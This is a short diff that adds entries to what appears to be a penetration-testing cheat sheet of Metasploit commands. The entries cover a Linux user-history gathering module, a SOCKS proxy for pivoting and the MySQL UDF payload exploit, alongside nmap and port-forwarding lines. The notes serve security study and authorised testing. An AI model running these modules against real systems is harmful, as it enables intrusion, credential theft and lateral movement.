@@ -167,3 +167,21 @@ portfwd list
 background
 nmap -sS -sV -p 1234 localhost
 ```
+# Meterpreter Post-Exploitation
+## Enum_users_Information
+
+```
+use post/linux/gather/enum_users_history
+
+```
+## Setting Proxy Socks
+
+```
+use auxiliary/server/socks_proxy
+```
+# Meterpreter mysql
+## remote server 
+```
+exploit/multi/mysql/mysql_udf_payload
+```
+
